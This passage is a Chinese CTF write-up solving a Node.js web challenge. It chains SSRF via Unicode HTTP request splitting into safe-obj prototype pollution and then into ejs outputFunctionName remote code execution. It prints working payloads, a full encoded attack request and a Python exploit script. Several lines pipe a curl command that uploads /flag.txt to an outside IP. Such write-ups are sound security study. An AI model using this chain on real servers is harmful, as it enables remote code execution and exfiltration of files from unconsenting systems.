        var q = req.query.q;
        var resp = "";
        if (q) {
            var url = 'http://localhost:3000/?q=' + q
                try {
                    http.get(url,(res1)=>{
                        const { statusCode } = res1;
                        const contentType = res1.headers['content-type'];
                        let error;
                        // 任何 2xx 状态码都表示成功响应，但这里只检查 200。
                        if (statusCode !== 200) {
                          error = new Error('Request Failed.\n' +
                                            `Status Code: ${statusCode}`);
                        }
                        if (error) {
                          console.error(error.message);
                          // 消费响应数据以释放内存
                          res1.resume();
                          return;
                        }
                        res1.setEncoding('utf8');
                        let rawData = '';
                        res1.on('data', (chunk) => { rawData += chunk;
                        res.end('request success') });
                        res1.on('end', () => {
                          try {
                            const parsedData = JSON.parse(rawData);
                            res.end(parsedData+'');
                          } catch (e) {
                            res.end(e.message+'');
                          }
                        });
                      }).on('error', (e) => {
                        res.end(`Got error: ${e.message}`);
                      })
                    res.end('ok');
                } catch (error) {
                    res.end(error+'');
                }
        } else {
            res.send("search param 'q' missing!");
        }
    })
    module.exports = router;
一眼猜到要用 `/curl` 路由来构造 **SSRF** 打 `/copy` 路由下的 **原型链污染** ，当然还差个 RCE，但是貌似源码里没找到
先看看咋打 **SSRF** ，这里要 POST /copy 的话很明显需要 **请求拆分**
查了下 `http.get`，参考 [Security Bugs in Practice: SSRF via Request
Splitting](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/)
发现在 nodejs The behaviour has been fixed in the recent Node.js 10 release, which will
> throw an error if the request path contains non-ascii characters. But for
> Node.js versions 8 or lower, any server that makes outgoing HTTP requests
> may be vulnerable to an SSRF via request splitting if it:
>
>   * Accepts unicode data from from user input, and
>   * Includes that input in the request path of an outgoing HTTP request, and
>   * The request has a zero-length body (such as a GET or DELETE).
>
然后看到一道题就用到了 [NodeJS SSRF by Response Splitting — ASIS CTF Finals 2018 — Proxy-Proxy Question Walkthrough](https://infosecwriteups.com/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501)
本地搭环境起来试了试，确实可以
然后看 **原型链污染**
这里很明显用 `safeobj.expand` 把接收到的东西给放到 user 里了
过滤了 `__proto__` 用 `constructor.prototype` 绕一下就行
这个库里直接递归按照 `.` 做分隔写入 obj，很明显可以原型链污染
_（后来发现也是现成 CVE-2021-25928_
那最后就是找哪里能 **RCE 或者 读文件** 了
既然源码里没有，那就是依赖了，瞄眼 `package.json`
    {
      "name": "hello-world",
      "version": "0.0.0",
      "private": true,
      "scripts": {
        "start": "node ./bin/www"
      },
      "dependencies": {
        "cookie-parser": "~1.4.4",
        "debug": "~2.6.9",
        "ejs": "^3.0.1",
        "express": "~4.16.1",
        "express-session": "^1.17.3",
        "http-errors": "~1.6.3",
        "jade": "^1.11.0",
        "jsonwebtoken": "^8.5.1",
        "lodash": "^4.2.1",
        "md5": "^2.3.0",
        "mongodb": "^4.10.0",
        "morgan": "~1.9.1",
        "mysql": "^2.18.1",
        "node-serialize": "^0.0.4",
        "pug": "2.0.0-beta11",
        "safe-obj": "^1.0.2"
      }
    }
pug! [2021
巅峰极客有个题](https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#ezjs) 打过！
但是这里用的渲染引擎是 ejs
（顺便，这里支持 json 或者 urlencoded
参考 [EJS, Server side template injection RCE (CVE-2022-29078) -writeup](https://eslam.io/posts/ejs-server-side-template-injection-rce/)
ejs 也有 RCE！
这里用到的 [ejs/3.0.1 在影响范围内](ejs/3.0.1 在范围内)（3.1.7 才 fix
构造个原型链污染把这个 `outputFunctionName` 赋值了就行
> 写wp的时候才发现上面那篇喵喵的 wp 就写了一句
>
>
> 
构造 RCE payload
    {"constructor.prototype.view options.outputFunctionName":"x;process.mainModule.require('child_process').execSync('touch /tmp/miao');s"}
（实际上直接 `constructor.prototype.outputFunctionName` 就行，不用 json 用 urlencode 也行
然后算好 content-length，试了下可以多不能少，不然解析就烂掉了请求不到 /copy 路由了
另外要多加个 `GET /` 之类的去闭合原来的请求
或者也可以在第二个请求的时候加个 `Connection: close` 头，就不会管之后的内容了
测试一下
成功 RCE！
试了下 docker 容器里没 `/dev/tcp`，又不需要弹 shell，干脆直接 curl 外带 flag 好了。
    curl -F "c=@/flag.txt" 11.11.111.111:1234
拼接一下
    a HTTP/1.1
    Host: 127.0.0.1
    POST /copy HTTP/1.1
    Content-type: application/json
    Content-Length: 159
    {"constructor.prototype.view options.outputFunctionName":"x;process.mainModule.require('child_process').execSync('curl -F c=@/flag.txt 11.11.111.111:1234');s"}
    POST /
    encodeURI("a\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1\u{010D}\u{010A}\u{010D}\u{010A}POST\u{0120}/copy\u{010D}\u{010A}Content-type:\u{0120}application/json\u{010D}\u{010A}Content-Length:\u{0120}159\u{010D}\u{010A}\u{010D}\u{010A}\u{017B}\u{0122}constructor.prototype.view\u{0120}options.outputFunctionName\u{0122}:\u{0122}x;process.mainModule.require(\u{0127}child_process\u{0127}).execSync(\u{0127}curl\u{0120}-F\u{0120}c=@/flag.txt\u{0120}11.11.111.111:1234\u{0127});s\u{0122}\u{017D}\u{010D}\u{010A}\u{010D}\u{010A}POST\u{0120}/")
测试发现 `{}""''` 这些都得用 Unicode 处理才行，也就是 `chr(0x0100 + ord(i))`，不如接收不到请求，只有请求了
/q=xxx 然后没了
最后拿去请求远程
    GET /curl?q=a%C4%A0HTTP/1.1%C4%8D%C4%8AHost:%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8APOST%C4%A0/copy%C4%A0HTTP/1.1%C4%8D%C4%8AContent-type:%C4%A0application/json%C4%8D%C4%8AContent-Length:%C4%A0159%C4%8D%C4%8A%C4%8D%C4%8A%C5%BB%C4%A2constructor.prototype.view%C4%A0options.outputFunctionName%C4%A2:%C4%A2x;process.mainModule.require(%C4%A7child_process%C4%A7).execSync(%C4%A7curl%C4%A0-F%C4%A0c=@/flag.txt%C4%A011.11.111.111:1234%C4%A7);s%C4%A2%C5%BD%C4%8D%C4%8A%C4%8D%C4%8APOST%C4%A0/
这题打的时候弄了老半天，早知道就自己写个脚本构造 payload 了，手动构造调了老半天写错了一堆（（
> 赛后看其他队伍 wp 才发现原来之前有题目出过类似的了，怪不得其他师傅这么快做出来了，脚本看上去都这么像
>
> [从 [GYCTF2020]Node Game 了解 nodejs
> HTTP拆分攻击](https://blog.csdn.net/weixin_46081055/article/details/119982707)
>
> 顺便贴个咱改的脚本
>  
>  
>     import requests
>     import urllib.parse
>  
>     payload = '''a HTTP/1.1
>     Host: 127.0.0.1
>  
>     POST /copy HTTP/1.1
>     Content-type: application/json
>     Content-Length: 159
>     Connection: close
>  
>     {"constructor.prototype.view
> options.outputFunctionName":"x;process.mainModule.require('child_process').execSync('curl
> -F c=@/flag.txt 11.11.111.111:1234');s"}
>  
>     POST /'''.replace("\n","\r\n")
>  
>     def payload_encode(raw):
>         ret = u""
>         for i in raw:
>             ret += chr(0x0100+ord(i))
>         return ret
>  
>     payload = payload_encode(payload)
>  
>     print(payload)
>     r = requests.get('http://xxxx/curl?q=' + urllib.parse.quote(payload))
>     print(r.text)
>  
>
> 其实可以把长度再算算的，摸了（
>
> 编码也可以用下面这样而不必把字母数字那些 ASCII 改了
>  
>  
>     payload = payload.replace('\r\n', '\u010d\u010a') \
>         .replace('+', '\u012b') \
>         .replace(' ', '\u0120') \
>         .replace('"', '\u0122') \
>         .replace("'", '\u0a27') \
>         .replace('[', '\u015b') \
>         .replace(']', '\u015d') \
>         .replace('`', '\u0127')
>  
>
> [NodeJS 中 Unicode 字符损坏导致的 HTTP
> 拆分攻击](https://www.anquanke.com/post/id/241429)
>
> [关于Prototype Pollution Attack的二三事](https://xz.aliyun.com/t/12053)
### unusual php
> 搞点不一样的php